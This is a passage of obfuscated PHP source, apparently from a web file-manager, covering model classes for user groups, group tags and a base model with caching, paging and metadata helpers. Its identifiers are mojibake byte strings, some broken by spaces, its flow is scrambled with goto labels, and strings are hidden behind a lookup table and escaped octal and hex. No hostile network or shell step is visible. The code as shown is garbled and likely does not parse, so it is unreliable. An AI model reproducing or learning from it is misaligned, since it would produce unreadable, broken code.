($cà¦¾•–[$BİÅœò­¬[478]] != 0) { $e¡Š‚ÊŞ× [] = $cà¦¾•–[$BİÅœò­¬[478]]; $cà¦¾•– = $E‚‰šÇ“ê[$cà¦¾•–[$BİÅœò­¬[478]]]; } goto Cæ‡³ç¶“; Cæ‡³ç¶“: $e¡Š‚ÊŞ× [] = 0; $e¡Š‚ÊŞ×  = $BİÅœò­¬[47] . implode($BİÅœò­¬[47], array_reverse($e¡Š‚ÊŞ× )) . $BİÅœò­¬[47]; $this->setNamePinyin($A„×—ç™®[$B¶§‰™åÌî], $A„×—ç™®[$BİÅœò­¬[28]]); goto FáßË¹…¾Û; eÕ¢³¦öªÚ: } return $E‚‰šÇ“ê; } public function groupNameAuto($A‘Ğ¡å…á, $CùÏâÁÕ¤–) { $f•Ò¢éíìÕ =& $_SERVER[œº]; $cÎ‹ö ò—¬ = $this->where(array($f•Ò¢éíìÕ[394] => $A‘Ğ¡å…á))->getField($f•Ò¢éíìÕ[28], !0); if (!$cÎ‹ö ò—¬ || !in_array($CùÏâÁÕ¤–, $cÎ‹ö ò—¬)) { return $CùÏâÁÕ¤–; } for ($D‡óôÚ‹É… = 1; $D‡óôÚ‹É… <= count($cÎ‹ö ò—¬) + 1; $D‡óôÚ‹É…++) { $BˆêçôÍÎ = $CùÏâÁÕ¤– . "\50{$D‡óôÚ‹É…}\51"; if (!in_array($BˆêçôÍÎ, $cÎ‹ö ò—¬)) { return $BˆêçôÍÎ; } } } public function groupSwitch($a‚½›ÌŠã˜, $Eä’³Í×ĞÒ) { goto eŞ¨£ Ï°; a”Ä« Î·œ: $Dƒ®ø™›» = !empty($cÑ¤Ïà²óå[$a‚½›ÌŠã˜]) ? $cÑ¤Ïà²óå[$a‚½›ÌŠã˜] : !1; if ($Dƒ®ø™›») { goto A³Ö‰”ÊŸÏ; A³Ö‰”ÊŸÏ: if (!$cÑ¤Ïà²óå[$Eä’³Í×ĞÒ]) { $cÑ¤Ïà²óå[$Eä’³Í×ĞÒ] = Model($d’¤—Ì†ÕÉ[790])->groupRootAdd($Eä’³Í×ĞÒ); } $Cä†¼Ş†µ = $cÑ¤Ïà²óå[$Eä’³Í×ĞÒ]; $fÍ¬­Ëµáƒ = array($d’¤—Ì†ÕÉ[478] => $Dƒ®ø™›»); goto EÚ˜§Æéˆß; FšŞæ¹ùƒ›: $aå–èÒ’Ò¿ = array($d’¤—Ì†ÕÉ[484] => $Eä’³Í×ĞÒ); Model($d’¤—Ì†ÕÉ[1790])->where($fÍ¬­Ëµáƒ)->save($aå–èÒ’Ò¿); Model($d’¤—Ì†ÕÉ[1791])->where($fÍ¬­Ëµáƒ)->save($aå–èÒ’Ò¿); goto DœöˆöÄÀ; bˆñß¡ ³‰: foreach ($cÑ¤Ïà²óå as $cŒƒª°Å”Ì) { $a¿Íî¥ïÜó = $cŒƒª°Å”Ì[$d’¤—Ì†ÕÉ[403]] == $d’¤—Ì†ÕÉ[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($d’¤—Ì†ÕÉ[790])->move($cŒƒª°Å”Ì[$d’¤—Ì†ÕÉ[395]], $Cä†¼Ş†µ, $a¿Íî¥ïÜó); } Model($d’¤—Ì†ÕÉ[790])->moveClearAuth = !0; $fÍ¬­Ëµáƒ = array($d’¤—Ì†ÕÉ[404] => 2, $d’¤—Ì†ÕÉ[484] => $a‚½›ÌŠã˜); goto FšŞæ¹ùƒ›; EÚ˜§Æéˆß: $cÑ¤Ïà²óå = Model($d’¤—Ì†ÕÉ[790])->where($fÍ¬­Ëµáƒ)->field($d’¤—Ì†ÕÉ[1789])->select(); if (!$cÑ¤Ïà²óå) { $cÑ¤Ïà²óå = array(); } Model($d’¤—Ì†ÕÉ[790])->moveClearAuth = !1; goto bˆñß¡ ³‰; DœöˆöÄÀ: } $this->_changeChildLevel($Eãàò¿Ã¹¼[$a‚½›ÌŠã˜], $Eãàò¿Ã¹¼[$Eä’³Í×ĞÒ], !0); goto e¦’É£å²¦; b»½ç†ÑßÜ: $fÍ¬­Ëµáƒ = array($d’¤—Ì†ÕÉ[404] => 2, $d’¤—Ì†ÕÉ[478] => 0, $d’¤—Ì†ÕÉ[403] => 1, $d’¤—Ì†ÕÉ[484] => array($d’¤—Ì†ÕÉ[7], array($a‚½›ÌŠã˜, $Eä’³Í×ĞÒ))); $cÑ¤Ïà²óå = Model($d’¤—Ì†ÕÉ[790])->where($fÍ¬­Ëµáƒ)->field($d’¤—Ì†ÕÉ[1788])->select(); $cÑ¤Ïà²óå = array_to_keyvalue($cÑ¤Ïà²óå, $d’¤—Ì†ÕÉ[484], $d’¤—Ì†ÕÉ[395]); goto a”Ä« Î·œ; E•«“è¨‹: $F¢ÄÌŞ‡éƒ = Model($d’¤—Ì†ÕÉ[1773])->where($fÍ¬­Ëµáƒ)->select(); if (!$F¢ÄÌŞ‡éƒ) { $F¢ÄÌŞ‡éƒ = array(); } foreach ($F¢ÄÌŞ‡éƒ as $D¨Õ ó™ÓÜ) { $CÏ¿†¡¥µŞ = $D¨Õ ó™ÓÜ[$d’¤—Ì†ÕÉ[1528]]; $fÍ¬­Ëµáƒ = array($d’¤—Ì†ÕÉ[1528] => $CÏ¿†¡¥µŞ, $d’¤—Ì†ÕÉ[1692] => $Eä’³Í×ĞÒ); $B…£‰´à  = Model($d’¤—Ì†ÕÉ[1773])->where($fÍ¬­Ëµáƒ)->find(); if (!$B…£‰´à ) { $A‘„İŒß´ = array($Eä’³Í×ĞÒ => $D¨Õ ó™ÓÜ[$d’¤—Ì†ÕÉ[1787]]); Model($d’¤—Ì†ÕÉ[506])->userGroupAdd($CÏ¿†¡¥µŞ, $A‘„İŒß´); } Model($d’¤—Ì†ÕÉ[506])->userGroupRemove($CÏ¿†¡¥µŞ, $a‚½›ÌŠã˜); } goto b»½ç†ÑßÜ; e¦’É£å²¦: $this->where(array($d’¤—Ì†ÕÉ[478] => $a‚½›ÌŠã˜))->save(array($d’¤—Ì†ÕÉ[478] => $Eä’³Í×ĞÒ)); return !0; goto CØÒÚÓç Ë; Dˆ ”ŒÄóÅ: $Eãàò¿Ã¹¼ = array_to_keyvalue($Eãàò¿Ã¹¼, $d’¤—Ì†ÕÉ[1692]); if (!isset($Eãàò¿Ã¹¼[$a‚½›ÌŠã˜]) || !isset($Eãàò¿Ã¹¼[$Eä’³Í×ĞÒ]) || $Eãàò¿Ã¹¼[$a‚½›ÌŠã˜][$d’¤—Ì†ÕÉ[478]] == 0) { return !1; } $fÍ¬­Ëµáƒ = array($d’¤—Ì†ÕÉ[1692] => $a‚½›ÌŠã˜); goto E•«“è¨‹; eŞ¨£ Ï°: $d’¤—Ì†ÕÉ =& $_SERVER[œº]; $fÍ¬­Ëµáƒ = array($d’¤—Ì†ÕÉ[1692] => array($d’¤—Ì†ÕÉ[7], array($a‚½›ÌŠã˜, $Eä’³Í×ĞÒ))); $Eãàò¿Ã¹¼ = $this->where($fÍ¬­Ëµáƒ)->select(); goto Dˆ ”ŒÄóÅ; CØÒÚÓç Ë: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($AÈÃ ×¢±) { $cÉß¥¤ÕÙ¦ =& $_SERVER[œº]; return array($cÉß¥¤ÕÙ¦[1792] => array($AÈÃ ×¢±[0], $cÉß¥¤ÕÙ¦[1793]), $cÉß¥¤ÕÙ¦[1794] => array($AÈÃ ×¢±[0], $cÉß¥¤ÕÙ¦[1795])); } protected function get($DØ”·æŠŸä) { $DÙ©‡¥Ãº¿ =& $_SERVER[œº]; $c¯˜º¦Œ‘ = Model($DÙ©‡¥Ãº¿[486])->metaGet($DØ”·æŠŸä, $DÙ©‡¥Ãº¿[1796]); $CéĞ½Óááã = json_decode($c¯˜º¦Œ‘, !0); return $CéĞ½Óááã ? $CéĞ½Óááã : array($DÙ©‡¥Ãº¿[1797] => $DÙ©‡¥Ãº¿[87], $DÙ©‡¥Ãº¿[367] => array()); } protected function set($eœàš—š¤, $eĞù„ÃÃŠé) { $e‘´ˆ‚±Ê‰ =& $_SERVER[œº]; $eĞù„ÃÃŠé = $eĞù„ÃÃŠé ? $eĞù„ÃÃŠé : array($e‘´ˆ‚±Ê‰[1797] => $e‘´ˆ‚±Ê‰[87], $e‘´ˆ‚±Ê‰[367] => array()); Model($e‘´ˆ‚±Ê‰[486])->metaSet($eœàš—š¤, $e‘´ˆ‚±Ê‰[1796], json_encode($eĞù„ÃÃŠé)); return Model($e‘´ˆ‚±Ê‰[486])->metaSet($eœàš—š¤, $e‘´ˆ‚±Ê‰[1796], json_encode($eĞù„ÃÃŠé)); } protected function getByTagID($AÒ½¬½İâƒ, $bÚ†½¹„‹Ö) { goto d¹¡Ó¯¢Ìä; a™±½´„†¯: $eÕ‘½‘åøâ = $this->get($AÒ½¬½İâƒ); if (!$eÕ‘½‘åøâ || !isset($eÕ‘½‘åøâ[$d¹ã¦Ã®«ù[367]])) { return !1; } $AöºÑ¯Ìæ = array_find_by_field($eÕ‘½‘åøâ[$d¹ã¦Ã®«ù[367]], $d¹ã¦Ã®«ù[393], $bÚ†½¹„‹Ö); goto F©êàÊ‘õ‘; d¹¡Ó¯¢Ìä: $d¹ã¦Ã®«ù =& $_SERVER[œº]; if (!$AÒ½¬½İâƒ || !$bÚ†½¹„‹Ö) { return !1; } if (!Model($d¹ã¦Ã®«ù[486])->getInfoSimple($AÒ½¬½İâƒ)) { return !1; } goto a™±½´„†¯; F©êàÊ‘õ‘: return is_array($AöºÑ¯Ìæ) ? $AöºÑ¯Ìæ : !1; goto F¾ÉÊÙ¯®ö; F¾ÉÊÙ¯®ö: } public function listSource($c‘†Ç·†è, $aè·İŞİ„À) { goto aî‹¹–‰Õ™; EØ„ôÙºÂ: foreach ($B¼ƒİ‡ ¦ as $Bç‚®¬äÚï => $C¸ô™Ëù‘¯) { $aÒ¶ßÚßŒª = !0; if (!$aè·İŞİ„À) { $b¥ˆ‚óÆØ[] = $Bç‚®¬äÚï; continue; } foreach ($aè·İŞİ„À as $bî¹Š‹…ÌÓ) { if (!in_array($bî¹Š‹…ÌÓ, $C¸ô™Ëù‘¯)) { $aÒ¶ßÚßŒª = !1; break; } } if ($aÒ¶ßÚßŒª) { $b¥ˆ‚óÆØ[] = $Bç‚®¬äÚï; } } if (!$b¥ˆ‚óÆØ) { return array(); } $D¸³Ğ¬·» = array($dÏ•öø¢¥Ÿ[410] => array($dÏ•öø¢¥Ÿ[411], $b¥ˆ‚óÆØ), $dÏ•öø¢¥Ÿ[484] => $c‘†Ç·†è, $dÏ•öø¢¥Ÿ[404] => SourceModel::TYPE_GROUP); goto eôÖù¹ÏÛº; cÊ©‡óƒ¨Ğ: $eÕ§ÕŠ£¨ = array_to_keyvalue($d›İƒ–×Ğø[$dÏ•öø¢¥Ÿ[75]], $dÏ•öø¢¥Ÿ[33], $dÏ•öø¢¥Ÿ[395]); $F÷íéŠ²„® = array_to_keyvalue($d›İƒ–×Ğø[$dÏ•öø¢¥Ÿ[74]], $dÏ•öø¢¥Ÿ[33], $dÏ•öø¢¥Ÿ[395]); $b¬Ä£‘ÊŒê = array_merge($F÷íéŠ²„®, $eÕ§ÕŠ£¨); goto B²‘õÔç°ô; eôÖù¹ÏÛº: $d›İƒ–×Ğø = Model($dÏ•öø¢¥Ÿ[1206])->listSource($D¸³Ğ¬·»); if (!$d›İƒ–×Ğø || count($b¥ˆ‚óÆØ) == $d›İƒ–×Ğø[$dÏ•öø¢¥Ÿ[364]][$dÏ•öø¢¥Ÿ[365]]) { return $d›İƒ–×Ğø; } $bÛÉØ­ê©Ì = array(); goto cÊ©‡óƒ¨Ğ; aî‹¹–‰Õ™: $dÏ•öø¢¥Ÿ =& $_SERVER[œº]; if ($aè·İŞİ„À && !is_array($aè·İŞİ„À)) { $aè·İŞİ„À = array($aè·İŞİ„À); } $DÛñ£Õ‡ö = $this->listData($c‘†Ç·†è); goto CÓ°Ğß‚¤Õ; B²‘õÔç°ô: foreach ($b¥ˆ‚óÆØ as $Dö§Î÷Ä¿¹) { if (!in_array($Dö§Î÷Ä¿¹, $b¬Ä£‘ÊŒê)) { $bÛÉØ­ê©Ì[] = $Dö§Î÷Ä¿¹; } } if ($bÛÉØ­ê©Ì) { $this->removeBySource($c‘†Ç·†è, $bÛÉØ­ê©Ì); } return $d›İƒ–×Ğø; goto dç†´˜ßÓƒ; CÓ°Ğß‚¤Õ: $B¼ƒİ‡ ¦ = array(); foreach ($DÛñ£Õ‡ö as $BÌ£¨”¶) { $Dö§Î÷Ä¿¹ = $BÌ£¨”¶[$dÏ•öø¢¥Ÿ[76]]; if (!$Dö§Î÷Ä¿¹) { continue; } if (!isset($B¼ƒİ‡ ¦[$Dö§Î÷Ä¿¹])) { $B¼ƒİ‡ ¦[$Dö§Î÷Ä¿¹] = array(); } $B¼ƒİ‡ ¦[$Dö§Î÷Ä¿¹][] = $BÌ£¨”¶[$dÏ•öø¢¥Ÿ[419]]; } $b¥ˆ‚óÆØ = array(); goto EØ„ôÙºÂ; dç†´˜ßÓƒ: } protected function listData($CÏ²ø¿Œø) { $e´å‹›‹Ù« =& $_SERVER[œº]; $EÇÖî•™ = array($e´å‹›‹Ù«[1520] => 0, $e´å‹›‹Ù«[463] => array($e´å‹›‹Ù«[1798], 0), $e´å‹›‹Ù«[415] => $e´å‹›‹Ù«[1799] . $CÏ²ø¿Œø); $cŒÕÀÛÀ¼ = $e´å‹›‹Ù«[1800]; $B¥½¥œÀ¡¨ = $this->field($cŒÕÀÛÀ¼)->where($EÇÖî•™)->order($e´å‹›‹Ù«[1801])->select(); return $B¥½¥œÀ¡¨ ? $B¥½¥œÀ¡¨ : array(); } protected function addToTag($E™ËóØÅ½Ö, $FæÄßµË¤, $FÕ¤ª‚ßŞÈ) { $EÈß· êó =& $_SERVER[œº]; if (!$this->getByTagID($E™ËóØÅ½Ö, $FÕ¤ª‚ßŞÈ) || !$FæÄßµË¤) { return !1; } if (!Model($EÈß· êó[790])->pathInfo($FæÄßµË¤)) { return !1; } $c†Ç“ù = array($EÈß· êó[1520] => 0, $EÈß· êó[463] => $FÕ¤ª‚ßŞÈ, $EÈß· êó[414] => $FæÄßµË¤, $EÈß· êó[415] => $EÈß· êó[1802] . $E™ËóØÅ½Ö, $EÈß· êó[413] => $EÈß· êó[33], $EÈß· êó[1696] => 0); if ($this->where($c†Ç“ù)->find()) { return !1; } return $this->add($c†Ç“ù); } protected function removeFromTag($D–¨¸¡Ö›ğ, $e†ê«Ü‹ö©, $bƒñÚÌÁÕÒ) { $d›äÚ†‚ä… =& $_SERVER[œº]; if (!$this->getByTagID($D–¨¸¡Ö›ğ, $bƒñÚÌÁÕÒ) || !$e†ê«Ü‹ö©) { return !1; } if (is_array($e†ê«Ü‹ö©)) { $e†ê«Ü‹ö© = array($d›äÚ†‚ä…[7], $e†ê«Ü‹ö©); } $c­ÁÂçåçÉ = array($d›äÚ†‚ä…[1520] => 0, $d›äÚ†‚ä…[463] => $bƒñÚÌÁÕÒ, $d›äÚ†‚ä…[415] => $d›äÚ†‚ä…[1802] . $D–¨¸¡Ö›ğ, $d›äÚ†‚ä…[414] => $e†ê«Ü‹ö©); return $this->where($c­ÁÂçåçÉ)->delete(); } protected function removeByTag($Cªˆ‡˜‡–«, $AŠ‘›Õç÷·) { $d‹´íŒªÀĞ =& $_SERVER[œº]; if (!$this->getByTagID($Cªˆ‡˜‡–«, $AŠ‘›Õç÷·)) { return !1; } $f†ÕÇ—éÛŒ = array($d‹´íŒªÀĞ[1520] => 0, $d‹´íŒªÀĞ[463] => $AŠ‘›Õç÷·, $d‹´íŒªÀĞ[415] => $d‹´íŒªÀĞ[1802] . $Cªˆ‡˜‡–«); return $this->where($f†ÕÇ—éÛŒ)->delete(); } protected function removeBySource($BÃ…¶ƒƒŒ, $DÅÑÀİ–¥Í) { $Aê‡Ï«íˆ =& $_SERVER[œº]; if (!$BÃ…¶ƒƒŒ || !$DÅÑÀİ–¥Í) { return !1; } if (is_array($DÅÑÀİ–¥Í)) { $DÅÑÀİ–¥Í = array($Aê‡Ï«íˆ[7], $DÅÑÀİ–¥Í); } $DÉ›’×À•Ø = array($Aê‡Ï«íˆ[1520] => 0, $Aê‡Ï«íˆ[414] => $DÅÑÀİ–¥Í, $Aê‡Ï«íˆ[463] => array($Aê‡Ï«íˆ[971], 0), $Aê‡Ï«íˆ[415] => $Aê‡Ï«íˆ[1802] . $BÃ…¶ƒƒŒ); return $this->where($DÉ›’×À•Ø)->delete(); } } goto dº©ùŒÊ; E„†ÉâÓœ–: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\146\x79\124\151\x6d\145", "\164\151\x6d\145", "\151\x6e\x73\145\162\164\54\165\x70\144\141\164\145", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\x63\162\145\141\164\x65\124\x69\155\145", "\164\x69\155\x65", "\151\x6e\163\145\x72\164", "\146\165\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($a²°¼ÑôÒ) { $this->dataAuto = $a²°¼ÑôÒ; } public function __construct($BßÅÌÎ¸Ø… = '', $fó‡Œ­Ôè‡ = '', $cˆê¡¬âÅŸ = '') { parent::__construct($BßÅÌÎ¸Ø…, $fó‡Œ­Ôè‡, $cˆê¡¬âÅŸ); } public static function textEncode($bŸó®ê»®æ) { if (!$bŸó®ê»®æ) { return $bŸó®ê»®æ; } $bÊ‚ÑÄ­½ = json_encode($bŸó®ê»®æ); $bÊ‚ÑÄ­½ = preg_replace_callback($_SERVER[œº][353], function ($B„øÕ¢Â™) { return addslashes($B„øÕ¢Â™[0]); }, $bÊ‚ÑÄ­½); return json_decode($bÊ‚ÑÄ­½); } public static function textDecode($B´†äÉ¨¼Ç) { $CÇ£¤ƒ™‡ô =& $_SERVER[œº]; $F¥‡‚éˆ¢³ = json_encode($B´†äÉ¨¼Ç); $F¥‡‚éˆ¢³ = preg_replace_callback($CÇ£¤ƒ™‡ô[354], function ($DŞç¯„ä¤š) { return $_SERVER[œº][97]; }, $F¥‡‚éˆ¢³); return json_decode($F¥‡‚éˆ¢³); } protected $tableMeta = array(); protected function _beforeInsert(&$eº°«Õô»ö, $BÃÆªæğË) { $DïÅŠ¸ÇÇ =& $_SERVER[œº]; if (!$this->checkDataAutoHas($DïÅŠ¸ÇÇ[355])) { return; } $this->dataBeforeFilter($eº°«Õô»ö, $DïÅŠ¸ÇÇ[355]); } protected function _beforeUpdate(&$C•œÑ©‘Ö, $EÍ•Æ¸¬Õ…) { $A÷Û‰¦Ş‰º =& $_SERVER[œº]; if (!$this->checkDataAutoHas($A÷Û‰¦Ş‰º[356])) { return; } $this->dataBeforeFilter($C•œÑ©‘Ö, $A÷Û‰¦Ş‰º[356]); } protected function _afterSelect(&$fãìƒ“ö·Ã, $C¹À‹É½ß²) { if (!is_array($fãìƒ“ö·Ã)) { return; } if (!$this->checkDataAutoHas($_SERVER[œº][357])) { return; } foreach ($fãìƒ“ö·Ã as &$dÆë’‹•íÖ) { $this->dataAfterFilter($dÆë’‹•íÖ); } unset($dÆë’‹•íÖ); } protected function _afterFind(&$f»‘åó™ƒé, $dÅÕÍŠ°ô°) { if (!is_array($f»‘åó™ƒé)) { return; } if (!$this->checkDataAutoHas($_SERVER[œº][357])) { return; } $this->dataAfterFilter($f»‘åó™ƒé); } public function setAutoIncrement($AÑ„±í‡ãÜ) { $bÖŸ‡Ôš˜Ç = array($this->getPk() => $AÑ„±í‡ãÜ); $cõÖÍñ„ÇÊ = $this->data($bÖŸ‡Ôš˜Ç)->add(); if ($cõÖÍñ„ÇÊ) { $this->delete($cõÖÍñ„ÇÊ); } } public function getAutoIncrement() { $dòø™È·â¬ = $this->getTableName(); $eŸ¤“À„É½ = $this->max($this->getPk()); $añ˜ÓÆ÷–Ç = $this->query("\x73\150\x6f\x77\40\164\x61\142\x6c\145\40\x73\164\141\x74\x75\x73\40\167\150\x65\162\x65\40\116\x61\155\145\75\47{$dòø™È·â¬}\x27"); $f˜ğƒ©…Š = $añ˜ÓÆ÷–Ç[0][$_SERVER[œº][358]]; $e‡×‚©÷ö = max($eŸ¤“À„É½, $f˜ğƒ©…Š); return $e‡×‚©÷ö; } protected function _callBefore($d‰›ˆ‡İ¾, $Cå†ƒÃá¿) { return $this->cacheCallCheck($d‰›ˆ‡İ¾, $Cå†ƒÃá¿, !1); } protected function _callAfter($eå²ã‹³« , $C†¹ìİ×êˆ) { return $this->cacheCallCheck($eå²ã‹³« , $C†¹ìİ×êˆ, !0); } protected function cacheFunctionAlias($DÁ™æ‰çÔ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($aîÓ­–ÂÓÁ, $bƒ‡‘ƒ‚Ëò, $cáóÈÃé®ó = false) { $C…ëÀ‡± = $this->cacheFunctionAlias($bƒ‡‘ƒ‚Ëò); if (!$C…ëÀ‡±) { return; } foreach ($C…ëÀ‡± as $CÁÛªŠ¦˜ => $fÈ”¸‰–ë‰) { $BºÇŒšÇç‹ = $fÈ”¸‰–ë‰[0]; $dƒÎèŞÎÙÑ = explode($_SERVER[œº][47], $fÈ”¸‰–ë‰[1]); if ($aîÓ­–ÂÓÁ == $CÁÛªŠ¦˜) { return $this->cacheFunctionGet($CÁÛªŠ¦˜, $BºÇŒšÇç‹); } if ($cáóÈÃé®ó && in_array($aîÓ­–ÂÓÁ, $dƒÎèŞÎÙÑ)) { $this->cacheFunctionClear($CÁÛªŠ¦˜, $BºÇŒšÇç‹); } } } public function cacheFunctionGet($a˜ÅŠ‰ªë°, $eÁ£º‚Ñ‘) { $A•©‰ôø™Š = $this->cacheKeyMake($a˜ÅŠ‰ªë°, $eÁ£º‚Ñ‘); $E˜ßà†ˆ‰ = Cache::get($A•©‰ôø™Š); if (!is_array($E˜ßà†ˆ‰)) { $E˜ßà†ˆ‰ = call_user_func_array(array($this, $a˜ÅŠ‰ªë°), array($eÁ£º‚Ñ‘, !0)); Cache::set($A•©‰ôø™Š, $E˜ßà†ˆ‰); } return $E˜ßà†ˆ‰; } public function cacheFunctionClear($Fà²²Ôõ‰ù, $b‹Æå…Áƒ”) { $CÙ×Ş½»–ß = $b‹Æå…Áƒ”; if (!is_array($b‹Æå…Áƒ”)) { $CÙ×Ş½»–ß = array($b‹Æå…Áƒ”); } foreach ($CÙ×Ş½»–ß as $eòğøÂÎ¢Û) { $Cš†æµ¦– = $this->cacheKeyMake($Fà²²Ôõ‰ù, $eòğøÂÎ¢Û); Cache::remove($Cš†æµ¦–); } } private function cacheKeyMake($F¡¨ÌÅ“, $fæáˆ²Õ) { $BÓÜÍºë„ =& $_SERVER[œº]; return get_class($this) . $BÓÜÍºë„[71] . $F¡¨ÌÅ“ . $BÓÜÍºë„[359] . $fæáˆ²Õ; } protected function selectPageReset() { $F°ìÉÛÁ« =& $_SERVER[œº]; if (isset($GLOBALS[$F°ìÉÛÁ«[360]])) { return; } $GLOBALS[$F°ìÉÛÁ«[360]] = isset($GLOBALS[$F°ìÉÛÁ«[7]][$F°ìÉÛÁ«[361]]) ? $GLOBALS[$F°ìÉÛÁ«[7]][$F°ìÉÛÁ«[361]] : !1; $GLOBALS[$F°ìÉÛÁ«[362]] = isset($GLOBALS[$F°ìÉÛÁ«[7]][$F°ìÉÛÁ«[351]]) ? $GLOBALS[$F°ìÉÛÁ«[7]][$F°ìÉÛÁ«[351]] : !1; $GLOBALS[$F°ìÉÛÁ«[7]][$F°ìÉÛÁ«[361]] = !1; $GLOBALS[$F°ìÉÛÁ«[7]][$F°ìÉÛÁ«[351]] = !1; } protected function selectPageRestore() { $aœˆçÛÃÄ =& $_SERVER[œº]; if (!isset($GLOBALS[$aœˆçÛÃÄ[360]])) { return; } $GLOBALS[$aœˆçÛÃÄ[7]][$aœˆçÛÃÄ[361]] = $GLOBALS[$aœˆçÛÃÄ[360]]; $GLOBALS[$aœˆçÛÃÄ[7]][$aœˆçÛÃÄ[351]] = $GLOBALS[$aœˆçÛÃÄ[362]]; unset($GLOBALS[$aœˆçÛÃÄ[360]]); unset($GLOBALS[$aœˆçÛÃÄ[362]]); } protected function selectPage($c·”¬õÊ³Á = 200, $A°Ÿµ®À¯¦ = 1) { goto bÑ®Ú“Ãë†; Aê­ğØÚé™: if (!is_array($cø¶ß¶¹‡)) { $cø¶ß¶¹‡ = array(); } if ($eƒŒÒÛ‰Ë‚ == 1) { $C…ÜÜõãˆá = count($cø¶ß¶¹‡); } $F¢ßßìÃÈ = array($FÔô˜¶éÊç[364] => array($FÔô˜¶éÊç[365] => $C…ÜÜõãˆá, $FÔô˜¶éÊç[361] => $c·”¬õÊ³Á, $FÔô˜¶éÊç[351] => $A°Ÿµ®À¯¦, $FÔô˜¶éÊç[366] => $eƒŒÒÛ‰Ë‚), $FÔô˜¶éÊç[367] => $cø¶ß¶¹‡); goto B£ÕÒê°çŠ; a®»¡º„ßÃ: $c·”¬õÊ³Á = $c·”¬õÊ³Á <= 5 ? 5 : ($c·”¬õÊ³Á >= $Fçò‰Ì¦†ì ? $Fçò‰Ì¦†ì : $c·”¬õÊ³Á); $A°Ÿµ®À¯¦ = intval(isset($in[$FÔô˜¶éÊç[351]]) && $in[$FÔô˜¶éÊç[351]] ? $in[$FÔô˜¶éÊç[351]] : $A°Ÿµ®À¯¦); $A°Ÿµ®À¯¦ = $A°Ÿµ®À¯¦ <= 1 ? 1 : $A°Ÿµ®À¯¦; goto d©äò„¶Û¬; d©äò„¶Û¬: $cø¶ß¶¹‡ = array(); $e¡óÓô†Åª = 1; if ($A°Ÿµ®À¯¦ == 1 && $e¡óÓô†Åª) { $this->optionsValue($E¯§éµ¼ƒ); $cø¶ß¶¹‡ = $this->page($A°Ÿµ®À¯¦, $c·”¬õÊ³Á)->select(); $C…ÜÜõãˆá = is_array($cø¶ß¶¹‡) ? count($cø¶ß¶¹‡) : 0; if ($C…ÜÜõãˆá < $c·”¬õÊ³Á) { $eƒŒÒÛ‰Ë‚ = 1; } else { $this->optionsValue($BŠƒØÕ™ƒ); $C…ÜÜõãˆá = intval($this->count()); $eƒŒÒÛ‰Ë‚ = ceil($C…ÜÜõãˆá / $c·”¬õÊ³Á); } } else { $this->optionsValue($BŠƒØÕ™ƒ); $C…ÜÜõãˆá = intval($this->count()); $eƒŒÒÛ‰Ë‚ = ceil($C…ÜÜõãˆá / $c·”¬õÊ³Á); $A°Ÿµ®À¯¦ = $A°Ÿµ®À¯¦ >= $eƒŒÒÛ‰Ë‚ ? $eƒŒÒÛ‰Ë‚ : $A°Ÿµ®À¯¦; $this->optionsValue($E¯§éµ¼ƒ); $cø¶ß¶¹‡ = $this->page($A°Ÿµ®À¯¦, $c·”¬õÊ³Á)->select(); } goto Aê­ğØÚé™; bî±åÃŸòõ: $BŠƒØÕ™ƒ = $E¯§éµ¼ƒ; $BŠƒØÕ™ƒ[$FÔô˜¶éÊç[363]] = array(); $c·”¬õÊ³Á = intval($c·”¬õÊ³Á); goto a®»¡º„ßÃ; bÑ®Ú“Ãë†: $FÔô˜¶éÊç =& $_SERVER[œº]; global $in; $E¯§éµ¼ƒ = $this->optionsValue(); goto C¦¢Œ§Ù¹; C¦¢Œ§Ù¹: $Fçò‰Ì¦†ì = 50000; $c·”¬õÊ³Á = isset($in[$FÔô˜¶éÊç[361]]) && $in[$FÔô˜¶éÊç[361]] ? $in[$FÔô˜¶éÊç[361]] : $c·”¬õÊ³Á; if ($c·”¬õÊ³Á === -1) { $in[$FÔô˜¶éÊç[361]] = !1; $Fçò‰Ì¦†ì = 100000000; $c·”¬õÊ³Á = $Fçò‰Ì¦†ì; } goto bî±åÃŸòõ; B£ÕÒê°çŠ: return $F¢ßßìÃÈ; goto dÉ¢ŞùˆŒ; dÉ¢ŞùˆŒ: } protected function checkLength($c°«Ç–Ä¸®, $AéëãæŒ„Ê = 0, $CóÀÓßÄ°… = '') { $cµ³Ã¹•¥’ =& $_SERVER[œº]; $AéëãæŒ„Ê = $AéëãæŒ„Ê ? $AéëãæŒ„Ê : 65536; if (!$c°«Ç–Ä¸® || strlen($c°«Ç–Ä¸®) < $AéëãæŒ„Ê) { return; } $CóÀÓßÄ°… = $CóÀÓßÄ°… ? $CóÀÓßÄ°… . $cµ³Ã¹•¥’[68] : $cµ³Ã¹•¥’[33]; show_json($CóÀÓßÄ°… . LNG($cµ³Ã¹•¥’[368]) . "\50{$AéëãæŒ„Ê}\x29", !1); } protected function metaSet($fˆÔèö¨Ç, $BÓŠõÖÅ ˜ = null, $f’×Ú…Æ÷ = null) { goto Eê»ç¼„¾; d’ô‚¥®†: if (is_string($BÓŠõÖÅ ˜)) { $AÆ–Ûó–²¡[$BÓŠõÖÅ ˜] = $f’×Ú…Æ÷; } $CèëÅ²½¢¯ = array(); foreach ($AÆ–Ûó–²¡ as $cÒĞ²íç¥Ş => $a­£§ƒÀ) { $this->checkLength($a­£§ƒÀ, !1, $aä†„“×´À . $fÀäË‡Ø‹[4] . $cÒĞ²íç¥Ş); $CèëÅ²½¢¯[] = array($FÊ‹¿îœê™ => $fˆÔèö¨Ç, $fÀäË‡Ø‹[93] => $cÒĞ²íç¥Ş, $fÀäË‡Ø‹[372] => $a­£§ƒÀ); } goto E™¦‡ùÉË; E™¦‡ùÉË: $cº‰šÉòÌì = $fÀäË‡Ø‹[373] . $this->tableMeta; CacheLock::lock($cº‰šÉòÌì); $A Š§Ö¤Ãé->where(array($FÊ‹¿îœê™ => $fˆÔèö¨Ç))->addAll($CèëÅ²½¢¯, array(), !0); goto C Ÿ³½ÓÖ–; f»„í³øƒ: $aä†„“×´À = $this->tableMeta[$fÀäË‡Ø‹[370]]; $A Š§Ö¤Ãé = Model($aä†„“×´À); 